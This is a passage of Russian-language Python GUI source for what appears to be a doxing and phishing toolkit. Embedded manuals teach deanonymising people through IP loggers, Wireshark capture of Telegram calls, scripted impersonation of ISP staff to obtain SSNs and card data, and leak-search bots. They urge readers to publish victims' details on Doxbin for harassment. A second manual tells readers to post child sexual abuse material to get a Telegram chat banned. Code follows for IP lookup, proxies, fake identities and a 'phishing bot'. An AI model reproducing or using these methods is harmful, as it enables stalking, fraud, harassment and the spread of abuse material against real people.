            "Докс (manual by QWENTY lvl 3.1)": 'BY QWENTY\n \nПервым делом вам нужно понять что произвести деанонимизацию возможно на любого члена общества, если человек позаботился о своей анонимности и замел следы который он оставил ранее,\nто вы можете попытаться найти ошибку из за которой он находиться под угрозой, ведь каждый человек допускает ошибки - это нормально. Порой из за таких ошибок грубо говоря человек покидает интернет.\nЧто бы не быть под угрозой в интернет обществе, вам следует очистить все следы вплоть до удаления страниц< смены номеров и отдельный девайс для \'работы\' \n\n Что такое Doxing?\n \nDoxing - – это раскрытие частной информации о человеке без его ведома или согласия. Это может включать адрес, работу, номер телефона, фотографии и многое другое. Социальные сети упростили доксинг и разрушили любую концепцию анонимности. Которая, как можно было бы подумать, существует. Сразу хочу вам сообщить о том что если вы деанонимизируете киберпреступников будь это доксер или лжеминер и сдаете данные в полицию то \nвам соответственно ничего не будет, так же если вы используете навыки доксинга с целью отпугнуть вашего обидчика будь это тролль или кто-то другой то это тоже караться законом не будет. Доксинг карается законом в том случае если же вы найденную информацию постите на всеми известный Doxbin. Ну мы же тут собрались не по закону действовать, верно?) Постить так называемые \'пасты\' ( паста - в доксинге означает информация собранная в специальный шаблон ) можно не только в Doxbin, но еще и в другие источники которые я оставлю в конце мануала.\n\n Как же совершить успешный Dox?\n\n\nДля успешного доксинга необходимо иметь время, но не всегда. Успешный доксинг может зависить не от времени но еще и от навыков, как раз таки про навыки я вам сегодня и расскажу. Максимум навыком понадобиться в том случае если же жертва имеет базовую анонимность, для успешного доксинга вам нужно анализировать каждую новую полученнную информацию о жертвве и доставать с нее новую и новую. Ведь доксинг - цепь. Почему? А потому что доксинг заключается в сборе информации с одной зацепки другую а с другой уже следущую.\n\n #1 -  Добывание  IP обидчика\n\nСамый простой способ - Айпи логгер - всеми известный способ достать айпи обидчика, но многие не догадываются что благодаря айпи можно узнать очень много инфомарции.\nДля того что бы узнать айпи обидчика самый легкий способ посадить его на ссылку соц-инженерией которую вы сделали на сайте и сократили.\nСсылка для создания айпи логгера - https://iplogger.org\nСсылка для сокращения ссылки айпи логгера - https://kurl.ru/\n\nСложный способ достования айпи адресса обидчика это инструмент wireshark\nСсылка на скачку - https://www.wireshark.org/download.html\nПодробное использование и установку вы можете глянуть на ютубе.\nСкачиваем Wireshark, открываем его и в фильтре обязательно указываем нужный нам протокол - STUN.\nнажимаем на "лупу" (найти пакет) и видим, как у нас появится новая строка с параметрами и поисковой строкой. Там выбираем параметр строка.\nВ строке пишем XDR-MAPPED-ADDRESS.\nвключаем Wireshark и звоним через Telegram. Как только пользователь ответит на звонок, тут же у нас начнут отображаться данные и среди них будет IP адрес юзера, которому звонили.\nчтобы понять, какой именно IP нам нужен, жмём уже в настроенном поисковике Найти, ищем в строке XDR-MAPPED-ADDRESS а то, что идёт после него и есть нужный нам IP\nПосле получения айпи обидчика мы идем его использовать в разных целях\n\n #2 - Использование IP обидчика \n\nIp адрес жертвы - очень важный момент в доксинге если нету основных зацепок, благодаря айпи адресу можно узнать много информации благодаря которой вы сократите себе поиски в значительном размере\nПрикреплю пару сайтов для добычи информации \nhttps://www.shodan.io/ \nhttps://whatismyipaddress.com/ip-lookup\nhttps://ipinfo.io/tools/map\nhttps://www.iptrackeronline.com/\nПрогнав айпи адресс жертвы по этим сайтам будет уже весомая информация по которой можно двигаться дальше.\n\n#3 - Isp doxnig\n\nПроверка подлинности у интернет-провайдера. Здесь вы начинаете узнавать, как найти действительно личную информацию\nо цели, просто используя ее IP-адрес. Используйте их IP-адрес, чтобы связаться с их провайдером\n и найти номер провайдера. Я приведу список\nинструментов в нижней части этого раздела. Это общедоступные инструменты, поскольку doxing ISP является общедоступным. Интернет-провайдер\ndoxing может предоставить вам множество информации о цели, начиная от их имени и\nадреса и заканчивая данными их кредитной карты и SSN в файле. Это смертельно опасная тактика, и\nлучше всего, если вы используете интернет-провайдера, которого трудно найти, если же вы хотите избежать воздействия со стороны интернет-провайдера.\nСовет: Как вам избежать проверки интернет-провайдером? Скрывайте свой IP любой ценой. Вот как вы\nизбегаете доксинга от интернет-провайдера.\nСовет X2: Вот пример того, как выглядит доксинг от интернет-провайдера.\nСотрудник интернет-провайдера: Здравствуйте, чем мы можем вам помочь? Это Сара.\nВы: Привет, Сара, это Том, вообще-то я сам работаю на этого интернет-провайдера, и мне было\nинтересно, не могли бы вы поискать клиента в одном из наших инструментов для меня. Мой инструмент\nсильно глючит, и по какой-то причине у меня не работает Интернет. Мне много не нужно\n, клиент связался со мной через чат поддержки, и мне нужен номер, чтобы перезвонить ему\n, и имя. Остальное я могу посмотреть в одном из наших инструментов.\nСотрудник интернет-провайдера: Жаль это слышать. Позвольте мне просто посмотреть IP-адрес в нашем главном\nинструменте. Минутку, пожалуйста.\n*Несколько минут спустя*\nХорошо, вот номер телефона клиента, связанный с IP-адресом, и его\nполное имя. Это все?\nВы: Да, мэм. Спасибо, Сара. Удачной смены.\nОбычно этого достаточно. Подключение к интернет-провайдеру может быть либо действительно простым (интернет-провайдер\nподключился к Comcast IP несколько недель назад, получил последние четыре SSN), либо действительно сложным\n(несколько дней назад не удалось подключиться к TWC-провайдеру, потребовалось около четырех попыток). Лучше всего, если у вас\nдостаточно глубокий голос и звучание\nОбычно это все, что требуется. Подключение к интернет-провайдеру может быть либо действительно простым (интернет-провайдер\nподключился к Comcast IP несколько недель назад, получил последние четыре SSN), либо действительно сложным\n(несколько дней назад не удалось подключиться к TWC-провайдеру, потребовалось около четырех попыток). Лучше всего, если у вас\nдостаточно глубокий голос и вы будете звучать правдоподобно (больше коучинга для женщин). Все, что\nтребуется, - это практика и правильное знание инструментов, чтобы получить некоторую живую поддержку.\nСовет X3: Если вы потерпите неудачу с одним человеком, не переживайте по этому поводу. Просто подождите несколько минут или часов\nи попробуйте обратиться к другому сотруднику службы поддержки. Некоторых интернет-провайдеров действительно трудно найти, в то время\nкак некоторые безумно просты.\nСовет X4: Вот список инструментов интернет-провайдера. Да, это инструменты, к которым у вас может быть доступ\n, потому что сам по себе ISP doxing является общедоступным, и я сомневаюсь, что вы о нем не слышали\n. В любом случае, это необходимые инструменты и информация для тех случаев, когда вы\nобщаетесь с кем-то через интернет-провайдера. Они значительно упрощают работу интернет-провайдера.\nThey make ISP doxing a lot easier.\n\nAT&T - http://www.att.com/\nU-verse Support: 1-800-288-2020\nEmployee IDs - md905c\n• Systems: G2, CCTP, SystemX, Clarify, Telegence, MyCSP, Phoenix,\nTorch, CSR Admin, CTI, Agent Verification System, CCC Tool, DLC, C-Care\nSky - http://www.sky.com/\nSky Tech Support: 0-844-241-1653\n• Systems: Cloud\nCox - http://ww2.cox.com/residential/home.cox\nCox Support: 877-891-2899\n• Systems: Polaris (IP), iNav, edgehealth, Icon, IDM, ICOMS, SL2\nCharter - https://www.charter.com/\nCharter Support: 713-554-3669\n• Systems: Sigma (Ask for this for lookup), IRIS\nComcast - http://www.comcast.com/\nComcast Support: 1-800-934-6489\n• Systems: ACSR, Comtrac, CSG, Einstein, Grand-slam (Ask for this for\nlookups), Vision\nTime Warner - http://www.timewarnercable.com/\nTime Warner Support - 212-364-8300\n• Systems: Real, Unify (Ask for this for lookups)\nRoad Runner - http://www.rr.com/\nRoad Runner Support: 1-866-744-1678\n• Systems: Real, Unify\nVerizon - http://www.verizonwireless.com/\nVerizon Support: 1-800-837-4966\n• Systems: Coffee\nItems that are capable for look up:\nName on file:\nDOB on file:\nSSN on file:\nPhone on file:\nAddress on file:\nISP Account #:\nPrimary Account Email:\nCredit Card on File:\n\nВот что вы получаете в ответе интернет провайдера если все прошло успешно.\n\n#4 - Поиск по имени обидчика\n\nИспользование имени цели также очень полезно. Если у вас есть их имя, то вы, возможно, сможете узнать, где они живут, какой у них номер телефона, родственники и т.д. что\nдействительно могло бы быть полезно в доксе. Мы собираемся искать цели на официальных\nстраницах и других сайтах, поскольку многие люди не думают удалять свою информацию на\nБелые страницы или просто не знают как. Их невежество будет их ошибкой.\nПо имени можно достать много чего, зная город, если же город вам не известен то следуйте пунктам  1  и 2 что бы узнать город и что-то большее.\n\nПоиск Соц-сетей по имеющимся данным\nhttps://bigbookname.com/search#\nhttps://rocketreach.co/\nhttps://my.mail.ru/my/search_people\n\nНа самом деле поиск по имени и доставание верной информации - одно из времязатратных дел.\n\n\n#5 - Поиск по нику \n\nЯ рекомендую вам скопировать псевдоним жертв в поисковики, такие как http://www.pipl.com, чтобы найти их аккаунты/профили в социальных сетях. \nВы также можете получить их настоящие имена с этого сайта, я предпочитаю вручную искать профиль жертв в FACEBOOK, зайдя на http://facebook.com и выполнив поиск по настоящим именам жертв таким образом. \nПосле того, как у вас есть их профиль в FACEBOOK, вам следует перейти в раздел друзей, чтобы найти профиль их родителей в FACEBOOK, выполнив поиск фамилии (только в том случае, если жертве не исполнилось 18 лет). \nКак только вы найдете профиль родителей на FACEBOOK, вы сможете найти их имя  на http://www.whitepages.com, чтобы найти их номер телефона. Если у вас есть их полное имя, их деанонимизация может быть проще, но не на 100%, \nтак как многие люди могут иметь то же имя, что и ваша цель Вам следует получить IP-адрес вашей цели,что бы вы могли сделать поиск по городу, данный поиск получиться более точным. \n\nВторой способ это всеми известный глаз бога, введите туда ник жертвы произведите поиск  по миру и возможно вам выдаст номер телефона жертвы. Мы плавно подходим к поиску по номеру\n\n \n#6 - Поиск по номеру телефона \n\nПоиск по номеру телефона один из самых главных шагов в деанонимизации.\n\nПоиск регистраций по сайтам - https://epieos.com/\n\nТот же поиск по сайтам где был привязан номер но уже в виде тулса - https://github.com/megadose/ignorant/\n\nПоиск компаний - https://www.find-org.com/\n\nПоиск утечек - https://odyssey-search.info/\n\nДля быстрого поиска по браузера что бы найти где светился номер и на каких сайтах к примеру в вк, воспользуйтесь\nintext:7999999999 ( вместо цифр используйте номер обидчика) таким способом у вас есть шанс найти упоминания номера телефона\nна различных сайтах. К примеру возьмем ВК очень часто люди оставляют номер в комментариях либо же постах.\nAVinfoBot (r) – делает отчет где есть данные из социальных сетей, недвижимости,\nавтомобилей, объявлений и телефонных книжек. Нужно пригласить другой аккаунт для\nотчета\n\n getcontact.com (r) — выдает информацию о том как записан номер в контактах\n\n@OffThisContactBot — поиск в утечках, ищет как записан номер в контактах,\nбольшая база контактов, бесплатно подключите свой бот\n\ntruecaller.com (r) — телефонная книга, ищет имя и оператора телефона\n\navinfo.guru (r) — проверка телефона владельца авто, иногда нужен VPN\n\nspravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес\n\nm.ok.ru — показывает часть номера телефона, email, фамилии и полностью город с\nдатой регистрации, используй во вкладке инкогнито\n\nsmartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не\nдоступен для новых пользователей\n\n@phone_avito_bot — дает ссылку на аккаунт Авито с подробной информацией\nlist-org.com — найдет организацию в РФ\nместа работы, контакты, а при регистрации можно указать любую российскую\nорганизацию\n\nfind-org.com — найдет компанию в РФ\n\nSaveRuData — покажет, полный адрес, имя, все из сервиса Яндекс Еда, СДЕК,\nтраты на еду за 6 месяцев, иногда работает через VPN\n\nx-ray.to (r) — в утечек найдет имя, аккаунты, адреса, почту\n\n@probei_ru_bot — даст ФИО, email, адрес регистрации, другие номера телефонов\n\n@telegaphone_bot — найдет детали заказов в доставке еды, поиск в утечке\n\nресторанов 2-Берега и Вкусные Суши\n\nbbro.su — найдет имя аккаунта на Авито и его объявления\nприложения GetContact\n\n@Zernerda_bot — ищет в двухсот слитых базах, находит адреса, имена, аккаунты и\nмного другого, бесплатный поиск после первого запуска бота\n\n@declassified_bot — найдет почту, имена, адреса, авто\n\n@detectiva_bot — выдаст вккаунт ВК, ОК, адреса, почту, утечк\n\n\n#6 - Поиск по почте обидчика \n\nИспользование электронной почты цели - удивительная вещь при выполнении doxing. \nВыполнение поискас помощью электронной почты, честно говоря, упрощает выполнение doxing. Вы можете использовать адрес электронной почты цели для множества целей.\nПоиск Facebook -\nВы можете получить доступ к Facebook вашей цели по электронной почте. Это занимает несколько шагов и совсем не сложно.\n1. Перейдите на страницу Facebook.com\n2. Выберите опцию “Забыли свой пароль?”\n3. В поле в середине страницы укажите адрес электронной почты получателя.\n4. В нем должно быть указано имя цели, ее фотография, а иногда даже могут\nбыть указаны последние 4 цифры ее номера.\n5. Используйте имя, которое они вам только что дали, и / или фотографию и поместите их в dox. Мы\nвоспользуемся ими позже.\nСовет: Вы также можете использовать https://www.facebook.com/search.php?q = (электронная почта здесь), чтобы найти их Facebook.\nСовет X2: Это также может работать с номером телефона, следовательно, ввод номера телефона также является операцией\nКак говорилось раннее по фейсбуку можно найти много чего интернесного.\n\n#7  - Поиск по фото\nИногда использовать изображение при копировании может быть сложно, но это может дать хорошие результаты. \nЕсть два способа получить информацию из фотографий. Первый метод, который я объясню, заключается в использовании поисковой системы для поиска изображения в Интернете,\n а другой метод покажет вам, как получить exif-данные из изображения.\nПоиск по изображению\nЭто похоже на поиск в Google, но вместо этого используется изображение. Есть два сайта, которые могут это сделать. \nЯ перечислю их оба, но в своем объяснении я объясню, как использовать tineye. Они действительно эффективны и могут дать лучшие зацепки по целям. \nДопустим, у вас есть их фотография в Skype, и это та же самая фотография, которую они использовали на Facebook, как только вы выполните поиск по этой фотографии на одном из этих сайтов и найдете ее на их Facebook, \nвсе готово. У вас будет их название, которое может привести к тоннам информации.\nТеперь давайте перечислим сайты, которые мы можем использовать для этого.\nhttps://www.tineye.com / - “Проиндексировано 11,8 миллиардов изображений, и их число растет” https://images.google.com / - Это Google, черт возьми.\n\n\n#8 - Поиск по Telegram\n\nTelegago — найдет упоминание аккаунта в каналах, группах, включая приватные, а\nтак же в Telegraph статьях\nlyzem.com — найдет упоминание аккаунта в группах и каналах\n @usinfobot — по ID найдёт имя и ссылку аккаунта, работает в inline режиме, введите\nв поле ввода сообщения @usinfobot и Telegram ID\n cipher387.github.io — покажет архивированную страницу, даст 20+ прямых ссылок на\nсайты веб архивы, поиск по ссылке на аккаунт\n tgstat.com — поиск по публичным сообщениям в каналах, найдет упоминание\nаккаунта\n @SangMataInfo_bot — история изменения имени аккаунта\n@TeleSINT_Bot — найдет группы в которых состоит пользователь\n@creationdatebot — примерная дата создания аккаунта, бот принимает username,\nдля поиска по ID можно переслать сообщение от искомого пользователя\n@MySeekerBot — поисковик по иранским каналам\nTelegramOnlineSpy (t) — лог онлайн активности аккаунта, скажет когда был в сети\n Exgram — найдет упоминание аккаунта, это поисковая система на основе Яндекса,\nпоиск по 17 сайтам-агрегаторам, находит в Telegraph статьях, контактах, приватных и\nпубличных каналах с группами\n Commentgram — найдет упоминание аккаунта, поиск в комментариях к постам в\nTelegram, работает через Google\n Commentdex — найдет упоминание аккаунта, поиск в комментариях к постам в\nTelegram, работает через Яндекс\n @UniversalSearchRobot — по ID найдёт базовые адреса почты в сервисе Etlgr,\nстатус бана пользователя ботом ComBot, число блокировок, заблокированные\nсообщения и дату начала бана, архивное имя и аватар аккаунта\n smartsearchbot.com — бот находит ФИО, бесплатный поиск не доступен для новых\nпользователей\n @kruglyashik — канал с базой из 500K круглых видео-сообщений из русскоязычных\nгрупп, в поиске по каналу введите имя пользователя или #ID123456789 где 123456789\nID аккаунта\n @TgAnalyst_bot — находит номер телефона, старое имя аккаунта, логин, IP и\nустройство, местами могут быть ложные данные, первый поиск без регистрации, если\nеё пройти, то сливается ваш номер телефона\nглазбога.рф — найдет часть номера телефона, историю изменения ссылки\nаккаунта\n @clerkinfobot — дает номер телефона\nUsersBox.org — бот, по нику найдет номер телефона, бесплатный доступ 14 дней\nпосле первого запуска бота\n @TuriBot — выдает по ID имя пользователя аккаунта Telegram, отправь боту\nкоманду /resolve + ID\n @eyeofbeholder_bot — даёт интересы аккаунта, а платно выдаст историю\nизменения имени, номер телефона, группы и ссылки которые публиковал\nпользователь\n @regdatebot — выдаст примерную дату регистрации аккаунта, отправьте боту\nчисловой ID аккаунта или перешлите сообщение\n @QuickOSINT_Robot — найдет номер телефона, группы, id и ссылку аккаунта,\nпоиск по нику или ID аккаунта, всего 3 бесплатных запроса для новых аккаунтов\n @ki_wibot — найдет номер телефона в иранской утечке Telegram\n app.element.io (r) — найдет сохранённую копию аккаунта по ID, это аватарка и имя,\nпосле регистрации, нажми на +, и выбери "начать новый чат", введи id в поиск\n @OffThisContactBot — найдет номер телефона, почту, имя, для поиска создай и\nподключи свой тг-бот\n @Zernerda_bot — по ID находит телефон и ник аккаунта Telegram, бесплатный\nпоиск после первого запуска бота\n @declassified_bot — выдаст имена, телефон и почту\n @TeleScanOfficialBot — найдет группы в которых состоял пользователь, историю\nизменения имени, номер телефона\nПоиск через URL\n https://etlgr.me/conversations/123456789/subscription — найдет сохраненное имя\nаккаунта и статус подписки на @etlgr_bot, можно подставить к ID @etlgr.com и получить\nEmail адрес, замени 123456789 на ID аккаунта\nhttps://intelx.io/?s=https/t.me/USERNAME — найдет упоминание на сайтах и в слитых\nбазах, замените USERNAME на имя пользователя\nКак узнать по ID пользователя Telegram какие приватные группы он создал?\nБерем ID пользователя Telegram, например - 188610951\nПереводим тут из текста в 32 битный hex. Получается 0b 3d f9 87\n То что получилось тут переводим в base64, получается Cz35hw, где w надо убрать,\nт.е должно остаться первые 5 символов.\nСоставляем ссылку по которой будем искать.\nВсе приватные ссылки который создаст этот пользователь будут начинаться так:\nt.me/joinchat/Cz35h — Это не полная ссылка в приватную группу, а только её начало\nПоиск полной ссылки на группу\n Для DuckDuckGo и Yahoo\n"joinchat/Cz35h..." — вставьте в поиск эту фразу заменив Cz35h на то что у вас\nполучилось\n Для Yandex\ninurl:joinchat/Cz35h — вставьте в поиск эту фразу заменив Cz35h на то что у вас\nполучилось\n Для Google\n"joinchat/Cz35h" — вставьте в поиск эту фразу заменив Cz35h на то что у вас\nполучилось\nЧерез URL\nhttps://web.archive.org/web/*/t.me/joinchat/Cz35h/* — найдет запись в интернет архиве,\nзамените Cz35h на то что у вас получилось\n https://web.archive.org/web/*/telegram.me/joinchat/Cz35h/* — найдет запись в интернет\nархиве, замените Cz35h на то что у вас получилось\n\n\n\n#9 - Куда выкладывать свои работы? \n\nВы можете разместить dox на нескольких сайтах, чтобы человек был доступен всем в\nИнтернете, кто ищет его информацию. Лучше всего указать свой телеграмм  в dox, прежде чем публиковать их. Публикация dox может вызвать у объекта массу стресса из-за того, что люди\nбудут преследовать его. Ниже есть раздел о размещении dox с указанием сайтов\n, где его можно разместить, чтобы другие могли увидеть его и использовать в своих интересах, например,\nдля продвижения своего dox или даже для преследования его. Вы помогаете другим получить dox объекта, они помогают вам преследовать его, беспроигрышная ситуация.\n\nhttps://pastebin.com/\nhttps://doxbin.com/\n\nПрежде чем выкладывать работу, старайтесь как можно красивее оформить пасту.\n====================\nDropped by\n====================\nReason for Dox:\n====================\n*Personal Information:\nFull Name:\nPhone Number:\nDOB:\nEmail:\nPicture:\nAlias:\n====================\n*Location Information\nAddress:\nArea Code:\nZip:\nCity:\nState:\nCountry:\nContinent:\n====================\n*IP Information:\nIP Address:\nISP:\nHostname:\nVPN:\n====================\n*Social Media Accounts:\nTwitter:\nFacebook:\nSteam:\nInstagram:\n====================\nDropped by\n====================\n\n\n#10 - Итог\n \nЕсли же вы не нашли информацию в одном боте/сайте то ищите в другом, каждый бот/сайт пополняет каждый день базы данных\nкак вариант вам зайти тупо через некоторое время и попробовать заново. Не стоит завышать себя перед другими ведь если вдруг вас найдут, будет уже не до завышений самооценки, а люди на которых вы выебывались, будут смеяться xD\n\nВсегда если же вы не можете найти информацию возьмите отдых а после же к вам на светлую голову придет мысль как можно найти, у меня так было не раз\n\nВсегда думайте наперед ибо если же вы будете смотреть только вниз вы не сможете предвидеть обстановку которая вас ждет.\n\n\n\n\n\n\n\n                   ',
            "Снос телеграм чата": 'Снос телеграм чата \n\nчто нам нада:\n\n- твинк(левый ак в тг) который нам не жалко\n- цп(детс..), нам нужна гифка минимум, найти можно везде,\nтут уже ваше дело "осуждаем цп"\n\nдалее, изучаем чат, активны ли там админы, модеры и тд.\n\nкогда видем что ни 1 админ не в сети, кидаем цп и сразу же кидаем \nжалобу на это сообщение, лучше если жалоб будет много\n\nвсе, снесут ваш аккаунт и чат тоже - за запретку \n\n   *в ознакомительных целях',
        }

        self.init_ui()

    def init_ui(self):
        central_widget = QWidget(self)
        layout = QGridLayout(central_widget)

        self.label_input = QLabel("📃Выберите мануал для чтения:")
        layout.addWidget(self.label_input, 0, 0, 1, 2)
        self.label_input.setStyleSheet("font-size: 14px; font-weight: bold;")

        self.books_list = QListWidget()
        self.books_list.addItems(self.books.keys())
        layout.addWidget(self.books_list, 1, 0, 1, 2)
        self.books_list.setStyleSheet(list_style)
        self.books_list.itemClicked.connect(self.load_book)

        self.selected_book_label = QLabel("📃Выбранная книга:")
        layout.addWidget(self.selected_book_label, 2, 0, 1, 2)
        self.selected_book_label.setStyleSheet("font-size: 14px; font-weight: bold;")

        self.selected_book_display = QTextEdit()
        self.selected_book_display.setReadOnly(True)
        self.selected_book_display.setPlaceholderText(
            "Выберите книгу для отображения..."
        )
        layout.addWidget(self.selected_book_display, 3, 0, 1, 2)
        self.selected_book_display.setStyleSheet(book_style)

        self.reading_mode_button = QPushButton("Режим чтения")
        self.reading_mode_button.clicked.connect(self.toggle_reading_mode)
        layout.addWidget(self.reading_mode_button, 4, 0, 1, 2)
        self.reading_mode_button.setStyleSheet(button_style)

        layout.setRowStretch(1, 2)
        layout.setRowStretch(3, 3)
        layout.setColumnStretch(0, 1)
        layout.setColumnStretch(1, 1)

        self.setCentralWidget(central_widget)

    def load_book(self, item):
        book_name = item.text()
        book_content = self.books.get(book_name, "Содержание книги не найдено.")
        self.selected_book_display.setText(book_content)

    def toggle_reading_mode(self):
        """Переключение режима чтения."""
        if not self.reading_mode:
            self.setStyleSheet("background-color: #A7C7E7; color: #000000;")
            self.selected_book_display.setStyleSheet(
                """
                QTextEdit {
                    background-color: #1E3A5F;
                    color: #A7C7E7;
                    font-size: 16px;
                    padding: 10px;
                    border: 1px solidrgb(50, 105, 255);
                    border-radius: 5px;
                }
            """
            )
            self.books_list.setStyleSheet(
                """
                QListWidget {
                    background-color:(#A7C7E7));
                    color: #000000;
                    border: 1px solid #CCCCCC;
                    font-size: 16px;
                }
            """
            )

            self.resize(800, 600)

            self.reading_mode_button.setText("Обычный режим")
        else:
            self.setStyleSheet(background)
            self.selected_book_display.setStyleSheet(book_style)
            self.books_list.setStyleSheet(list_style)
            self.reading_mode_button.setText("Режим чтения")
            self.resize(400, 300)

        self.reading_mode = not self.reading_mode



class IPSearch(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("IP Search")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setStyleSheet(background)

        layout = QtWidgets.QVBoxLayout(self)

        self.ip_input = QtWidgets.QLineEdit(self)
        self.ip_input.setPlaceholderText("Введите IP-адрес...")
        self.ip_input.setStyleSheet(text_input_style)
        layout.addWidget(self.ip_input)

        self.search_button = QtWidgets.QPushButton("Найти", self)
        self.search_button.setStyleSheet(button_style)
        self.search_button.clicked.connect(self.ip_search)
        layout.addWidget(self.search_button)
        self.search_button.setFixedSize(400, 30)

        self.results = QtWidgets.QTextEdit(self)
        self.results.setReadOnly(True)
        self.results.setStyleSheet(output_style)
        layout.addWidget(self.results)

        self.setLayout(layout)

    def ip_search(self):
        getIP = self.ip_input.text().strip()
        if not getIP:
            self.results.setText("Введите IP-адрес.")
            return

        url = f"https://ipinfo.io/{getIP}/json"

        try:
            getInfo = urllib.request.urlopen(url)
            infoList = json.load(getInfo)

            # Формируем результаты
            result_text = (
                f"IP: {infoList.get('ip', 'N/A')}\n"
                f"Город: {infoList.get('city', 'N/A')}\n"
                f"Регион: {infoList.get('region', 'N/A')}\n"
                f"Страна: {infoList.get('country', 'N/A')}\n"
                f"Временная зона: {infoList.get('timezone', 'N/A')}\n"
                f"Координаты: {infoList.get('loc', 'N/A')}\n"
                f"Название хоста: {infoList.get('hostname', 'N/A')}\n"
                f"Индекс: {infoList.get('postal', 'N/A')}\n\n"
            )

            result_text += self.whois_ip_info(getIP)
            self.results.setText(result_text)

        except Exception as e:
            self.results.setText(f"Ошибка при получении информации: {e}")

    def whois_ip_info(self, ip):
        try:
            w = whois.whois(ip)

            whois_info = (
                f"WHOIS Информация:\n"
                f"Домен: {w.get('domain_name', 'N/A')}\n"
                f"Адрес: {w.get('address', 'N/A')}\n"
                f"Организация: {w.get('org', 'N/A')}\n"
                f"Контакты: {w.get('emails', 'N/A')}\n"
                f"Дата регистрации: {w.get('creation_date', 'N/A')}\n"
                f"Дата обновления: {w.get('updated_date', 'N/A')}\n\n"
            )
            return whois_info
        except Exception as e:
            return f"Ошибка при получении WHOIS информации: {e}"


class ProxyFinder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Proxy_Finder by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setStyleSheet(background)
        self.init_ui()

    def init_ui(self):
        central_widget = QWidget(self)
        layout = QGridLayout(central_widget)

        self.label_type = QLabel("Выберите тип прокси:")
        layout.addWidget(self.label_type, 0, 0)
        self.label_type.setStyleSheet(
            "font-size: 14px; font-weight: bold; color: white;"
        )

        self.type_selector = QComboBox()
        self.type_selector.addItems(["HTTP", "HTTPS", "SOCKS4", "SOCKS5"])
        layout.addWidget(self.type_selector, 0, 1)
        self.type_selector.setStyleSheet(selector_style)

        self.find_button = QPushButton("Найти прокси")
        self.find_button.clicked.connect(self.find_proxies)
        layout.addWidget(self.find_button, 0, 2)
        self.find_button.setStyleSheet(button_style)

        self.proxy_table = QTableWidget()
        self.proxy_table.setColumnCount(5)
        self.proxy_table.setHorizontalHeaderLabels(
            ["Адрес", "Порт", "Тип", "Страна", "Скорость"]
        )
        self.proxy_table.horizontalHeader().setStretchLastSection(True)
        self.proxy_table.setStyleSheet(table_style)
        layout.addWidget(self.proxy_table, 1, 0, 1, 3)

        self.proxy_table.horizontalHeader().setStyleSheet(table_style2)
        self.proxy_table.verticalHeader().setStyleSheet(table_style2)

        self.setCentralWidget(central_widget)

    def find_proxies(self):
        proxy_type = self.type_selector.currentText().lower()
        try:
            proxies = self.get_proxies(proxy_type)
            self.display_proxies(proxies, proxy_type)
        except Exception as e:
            QMessageBox.critical(self, "Ошибка", f"Не удалось получить прокси: {e}")

    def get_proxies(self, proxy_type):
        url = f"https://proxylist.geonode.com/api/proxy-list?limit=10&type={proxy_type}"
        response = requests.get(url)
        if response.status_code != 200:
            raise Exception("Ошибка подключения к API")
        proxies_data = response.json()
        return [
            {
                "ip": proxy["ip"],
                "port": proxy["port"],
                "country": proxy["country"],
                "speed": f"{proxy['speed']} ms",
            }
            for proxy in proxies_data["data"]
        ]

    def display_proxies(self, proxies, proxy_type):
        self.proxy_table.setRowCount(len(proxies))
        for row, proxy in enumerate(proxies):
            self.proxy_table.setItem(row, 0, QTableWidgetItem(proxy["ip"]))  # IP
            self.proxy_table.setItem(row, 1, QTableWidgetItem(proxy["port"]))  # Port
            self.proxy_table.setItem(row, 2, QTableWidgetItem(proxy_type.upper()))  # Type
            self.proxy_table.setItem(row, 3, QTableWidgetItem(proxy["country"]))  # Country
            self.proxy_table.setItem(row, 4, QTableWidgetItem(proxy["speed"]))  # Speed
        self.proxy_table.resizeColumnsToContents()


class FakePersonGenerator(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Fake_Person_Generator by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setStyleSheet(background)

        layout = QtWidgets.QVBoxLayout(self)

        self.generate_button = QtWidgets.QPushButton("Сгенерировать личность", self)
        self.generate_button.setStyleSheet(button_style)
        self.generate_button.clicked.connect(self.generate_identity)
        layout.addWidget(self.generate_button)
        self.generate_button.setFixedSize(400, 30)

        self.results = QtWidgets.QTextEdit(self)
        self.results.setReadOnly(True)
        self.results.setStyleSheet(output_style)
        layout.addWidget(self.results)

        self.setLayout(layout)

    def generate_identity(self):
        fake = Faker('ru_RU')
        identity = f"""
    ФИО: {fake.name()}
    Адрес: {fake.address()}
    Электронная почта: {fake.email()}
    Телефон: {fake.phone_number()}
    Должность: {fake.job()}
    Компания: {fake.company()}
    Дата рождения: {fake.date_of_birth()}
        """
        self.results.setText(identity)


class BotPollingThread(Thread):
    def __init__(self, bot):
        super().__init__()
        self.bot = bot
        self.daemon = True

    def run(self):
        try:
            self.bot.polling(none_stop=True)
        except Exception as e:
            pass


class TG_Bot(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.token = None
        self.admin_id = None
        self.bot = None
        self.polling_thread = None
        self.tray_icon = None
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Fishing_Telegram_Bot by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setStyleSheet(background)

        layout = QtWidgets.QVBoxLayout(self)

        self.token_input = QtWidgets.QLineEdit(self)
        self.token_input.setPlaceholderText("Введите токен вашего бота")
        self.token_input.setStyleSheet(text_input_style)
        layout.addWidget(self.token_input)

        self.admin_id_input = QtWidgets.QLineEdit(self)
        self.admin_id_input.setPlaceholderText("Введите ваш Telegram ID")
        self.admin_id_input.setStyleSheet(text_input_style)
        layout.addWidget(self.admin_id_input)

        self.start_bot_button = QtWidgets.QPushButton("Запустить фишинг-бота", self)
        self.start_bot_button.clicked.connect(self.start_bot)
        self.start_bot_button.setStyleSheet(button_style)
        layout.addWidget(self.start_bot_button)

        self.minimize_button = QtWidgets.QPushButton("Свернуть в трей", self)
        self.minimize_button.clicked.connect(self.minimize_to_tray)
